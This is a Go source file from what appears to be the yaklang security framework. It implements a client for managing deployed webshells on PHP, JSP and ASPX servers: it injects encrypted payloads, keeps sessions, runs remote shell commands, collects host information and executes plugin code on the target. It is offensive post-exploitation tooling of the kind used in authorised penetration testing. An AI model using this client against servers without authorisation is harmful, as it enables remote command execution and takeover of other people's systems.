package wsm

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"github.com/google/uuid"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/utils/lowhttp"
	"github.com/yaklang/yaklang/common/utils/lowhttp/poc"
	"github.com/yaklang/yaklang/common/wsm/payloads"
	"github.com/yaklang/yaklang/common/wsm/payloads/behinder"
	"github.com/yaklang/yaklang/common/wsm/payloads/yakshell"
	"github.com/yaklang/yaklang/common/yakgrpc/ypb"
	"time"
)

type YakShell struct {
	Url           string
	Pass          string
	Charset       string
	ShellScript   string            //shell类型
	ReqCipherMode string            //加密方式
	ResCipherMode string            //返回包解密方式
	Proxy         string            //代理
	Os            string            //系统
	IsSession     bool              //是否启用session mode
	Retry         int64             //重试次数
	Timeout       int64             //超时
	BlockSize     int64             //分块大小
	MaxSize       int64             //上传包最大（M）
	Posts         map[string]string //在post中添加的数据
	Headers       map[string]string //在headers中添加的数据

	cache      *utils.Cache[string] //缓存cookie
	remoteFunc map[string]struct{}  //远程方法缓存
}

func NewYakShell(shell *ypb.WebShell) (*YakShell, error) {
	Yak := &YakShell{
		Url:           shell.Url,
		Pass:          shell.Pass,
		Charset:       shell.Charset,
		ShellScript:   shell.ShellScript,
		ReqCipherMode: shell.EncMode,
		ResCipherMode: shell.ResDecMOde,
		Proxy:         shell.Proxy,
		IsSession:     shell.ShellOptions.IsSession,
		Retry:         shell.ShellOptions.RetryCount,
		Timeout:       shell.ShellOptions.Timeout,
		BlockSize:     shell.ShellOptions.BlockSize,
		MaxSize:       shell.ShellOptions.MaxSize,
		Posts:         make(map[string]string, 2),
		Headers:       make(map[string]string, 2),
		Os:            shell.Os,
		cache:         utils.NewTTLCache[string](time.Second * 60 * 20),
		remoteFunc:    make(map[string]struct{}),
	}
	if shell.Headers != nil {
		Yak.Headers = shell.Headers
	}
	if shell.Posts != nil {
		Yak.Posts = shell.Posts
	}
	Yak.setContentType()
	return Yak, nil
}

func (y *YakShell) setContentType() {
	if _, ok := y.Headers["Content-type"]; ok {
		log.Infof("header has contains content-type")
		return
	}
	y.Headers["Content-type"] = "application/x-www-form-urlencoded"
}

func (y *YakShell) getOrCrateSession() string {
	if value, exists := y.cache.Get("session"); !exists {
		//session不存在，清空remote缓存
		for s, _ := range y.remoteFunc {
			delete(y.remoteFunc, s)
		}
		tmpSession := uuid.NewString()
		y.cache.Set("session", tmpSession)
		return tmpSession
	} else {
		return value
	}
}

// encryptAndSendPayload 加密并且发送请求
func (y *YakShell) encryptAndSendPayload(payload []byte, check bool) ([]byte, error) {
	encryption, err := yakshell.Encryption(payload, []byte(y.Pass), y.ReqCipherMode)
	if err != nil {
		return nil, err
	}
	post, err := y.post(encryption)
	if !check {
		return post, err
	}
	return y.handleResponse(post)
}

func (y *YakShell) getPostConfig() []poc.PocConfigOption {
	var config []poc.PocConfigOption
	for key, value := range y.Posts {
		config = append(config, poc.WithAppendPostParam(key, value))
	}
	config = append(config, poc.WithProxy(y.Proxy))
	config = append(config, poc.WithAppendHeaders(y.Headers))
	config = append(config, poc.WithTimeout(float64(y.Timeout)))
	//todo: 应该增加重试次数
	config = append(config, poc.WithRetryTimes(int(y.Retry)))
	config = append(config, poc.WithRetryInStatusCode(404, 403, 502, 503, 500))
	if y.IsSession {
		config = append(config, poc.WithSession(y.getOrCrateSession()))
	}
	return config
}

func (y *YakShell) post(data []byte) ([]byte, error) {
	options := append(y.getPostConfig(), poc.WithAppendPostParam(y.Pass, string(data)))
	resp, _, err := poc.DoPOST(y.Url, options...)
	if err != nil {
		return nil, utils.Errorf("http request error: %v", err)
	}
	_, body := lowhttp.SplitHTTPHeadersAndBodyFromPacket(resp.RawPacket)
	//if len(body) == 0 {
	//	return nil, utils.Errorf("empty response")
	//}
	body = bytes.TrimSuffix(body, []byte("\r\n\r\n"))
	return body, nil
}

// injectPayload 注入全部payload
func (y *YakShell) injectPayload() error {
	var data []byte
	var err error
	var tmpMap = make(map[string]string, 2)
	switch y.ShellScript {
	case ypb.ShellScript_PHP.String():
		fallthrough
	case ypb.ShellScript_ASPX.String():
		fallthrough
	case ypb.ShellScript_JSP.String():
		data, err = y.getPayload(payloads.AllPayload, tmpMap, true, false)
	default:
		log.Errorf("webshell类型错误")
		return utils.Errorf("not found this script")
	}
	if _, err = y.encryptAndSendPayload(data, false); err != nil {
		return err
	}
	return nil
}
func (y *YakShell) InjectPayloadIfNoCookie() error {
	if y.IsSession {
		if _, exists := y.cache.Get("session"); !exists {
			return y.injectPayload()
		}
		log.Infof("当前session未过期，不进行重新注入")
	} else {
	}
	return nil
}

func (y *YakShell) getPayload(binCode payloads.Payload, params yakshell.Param, sessionInit, forceHandle bool) ([]byte, error) {
	var rawPayload []byte
	var err error
	var hexCode string
	if y.IsSession {
		if !sessionInit && !forceHandle {
			//可以搞在这块来进行session mode的动态加密
			return []byte(params.Serialize()), nil
		}
	}

	//如果不是forceHandle就进行处理参数
	if !forceHandle {
		y.processParams(params)
	}
	if y.IsSession && !forceHandle {
		//如果是session就每次都获取到AllPayload去做解析
		hexCode = payloads.YakShellPayload[y.ShellScript][payloads.AllPayload]
	} else {
		hexCode = payloads.YakShellPayload[y.ShellScript][binCode]
	}
	//if y.IsSession && first && y.ShellScript == ypb.ShellScript_PHP.String() {
	//	return hex.DecodeString(hexCode)
	//}
	switch y.ShellScript {
	case ypb.ShellScript_PHP.String():
		rawPayload, _, err = behinder.GetRawPHP(hexCode, params)
	case ypb.ShellScript_JSP.String():
		rawPayload, err = behinder.GetRawClass(hexCode, params)
	case ypb.ShellScript_ASPX.String():
		rawPayload, err = behinder.GetRawAssembly(hexCode, params)
	}
	return rawPayload, err
}

func (y *YakShell) ClientRequestEncode(raw []byte) ([]byte, error) {
	//TODO implement me
	return nil, nil
}

func (y *YakShell) ServerResponseDecode(raw []byte) ([]byte, error) {
	//TODO implement me
	return nil, nil
}

func (y *YakShell) handleResponse(data []byte) ([]byte, error) {
	decryption, err := yakshell.Decryption(data, []byte(y.Pass), y.ResCipherMode)
	if err != nil {
		return nil, err
	}
	var raw interface{}
	if err = json.Unmarshal(decryption, &raw); err != nil {
		return nil, err
	}
	var result []byte
	if decodedMap, ok := raw.(map[string]interface{}); ok {
		if status, exists := decodedMap["status"]; exists {
			if status != "ok" {
				decodeString, _ := base64.StdEncoding.DecodeString(decodedMap["msg"].(string))
				return nil, utils.Errorf("execute fail: %v", decodeString)
			}
		} else {
			return nil, utils.Error("status field not found in the JSON data")
		}
		if s, _ok := decodedMap["msg"].(string); _ok {
			result, err = base64.StdEncoding.DecodeString(s)
			if err != nil {
				return nil, err
			}
		}
	} else {
		return nil, utils.Error("unexpected data format")
	}
	return result, nil
}

func (y *YakShell) SetPacketScriptContent(content string) {
	//TODO implement me
}

func (y *YakShell) EchoResultEncodeFormYak(raw []byte) ([]byte, error) {
	return yakshell.Encryption(raw, []byte(y.Pass), y.ReqCipherMode)
}

func (y *YakShell) EchoResultDecodeFormYak(raw []byte) ([]byte, error) {
	return yakshell.Decryption(raw, []byte(y.Pass), y.ReqCipherMode)
}

func (y *YakShell) SetPayloadScriptContent(content string) {
	//TODO implement me
}

func (y *YakShell) processParams(params map[string]string) {
	params["pass"] = y.Pass
	value, ok := payloads.EncryptPayload[y.ShellScript][y.ResCipherMode]
	if !ok {
		return
	}
	switch y.ShellScript {
	case ypb.ShellScript_ASPX.String():
		// todo
		params["customEncoderFromAssembly"] = base64.StdEncoding.EncodeToString([]byte(value))
	case ypb.ShellScript_JSP.String(), ypb.ShellScript_JSPX.String():
		params["customEncoderFromClass"] = base64.StdEncoding.EncodeToString([]byte(value))
	case ypb.ShellScript_PHP.String(), ypb.ShellScript_ASP.String():
		params["customEncoderFromText"] = value
	}
}

func (y *YakShell) Ping(opts ...behinder.ExecParamsConfig) (bool, error) {
	var argsMap = make(map[string]string, 2)
	if err := y.InjectPayloadIfNoCookie(); err != nil {
		return false, err
	}
	if y.IsSession {
		argsMap["action"] = "ping"
	}
	payload, err := y.getPayload(payloads.EchoGo, argsMap, false, false)
	if err != nil {
		return false, err
	}
	_, err = y.encryptAndSendPayload(payload, true)
	if err != nil {
		return false, err
	}
	// 获取到payload session和custom
	return true, nil
}

func (y *YakShell) BasicInfo(opts ...behinder.ExecParamsConfig) ([]byte, error) {
	if err := y.InjectPayloadIfNoCookie(); err != nil {
		return nil, err
	}
	var argsMap = make(map[string]string, 2)
	if y.IsSession {
		argsMap["action"] = "info"
	}
	payload, err := y.getPayload(payloads.BasicInfoGo, argsMap, false, false)
	if err != nil {
		return nil, err
	}
	return y.encryptAndSendPayload(payload, true)
}

func (y *YakShell) CommandExec(cmd string, opts ...behinder.ExecParamsConfig) ([]byte, error) {
	if err := y.InjectPayloadIfNoCookie(); err != nil {
		return nil, err
	}
	var argsMap = make(map[string]string, 2)
	if y.IsSession {
		argsMap["action"] = "cmd"
	}
	argsMap["command"] = cmd
	payload, err := y.getPayload(payloads.CmdGo, argsMap, false, false)
	if err != nil {
		return nil, err
	}
	return y.encryptAndSendPayload(payload, true)
}

func (y *YakShell) String() string {
	//TODO implement me
	panic("implement me")
}

// ExecutePlugin 执行额外的插件功能
func (y *YakShell) ExecutePluginOrCache(param map[string]string) ([]byte, error) {
	/*
		如果是session，code~~返回未填充的包,参数
		如果不是session，就需要返回填充之后的包
	*/
	if err := y.InjectPayloadIfNoCookie(); err != nil {
		return nil, err
	}
	var (
		_payload []byte
		_error   error
		codeMode = param["mode"]
	)
	delete(param, "mode")
	delete(param, "action") //如果有的话，就删除
	if !y.IsSession {
		_payload, _error = y.getPayload(payloads.Payload(codeMode), param, false, false)
	} else {
		//拿到参数集合
		args, err := y.getPayload("", param, false, false)
		if err != nil {
			return nil, err
		}
		var data = make(map[string]string)
		data["mode"] = codeMode
		if _, exit := y.remoteFunc[codeMode]; exit {
			data["action"] = "cache"
			data["args"] = string(args)
			_payload, _error = y.getPayload("", data, false, false)
		} else {
			data["action"] = "plugin"
			data["args"] = string(args)
			payload, err1 := y.getPayload(payloads.Payload(codeMode), map[string]string{}, false, true)
			if err1 != nil {
				return nil, err1
			}
			data["code"] = base64.StdEncoding.EncodeToString(payload) //拿到源码
			_payload, _error = y.getPayload("", data, false, false)
			y.remoteFunc[codeMode] = struct{}{}
		}
	}
	if _error != nil {
		return nil, _error
	}
	return y.encryptAndSendPayload(_payload, true)
}
func (y *YakShell) GenWebShell() string {
	//TODO implement me
	panic("implement me")
}
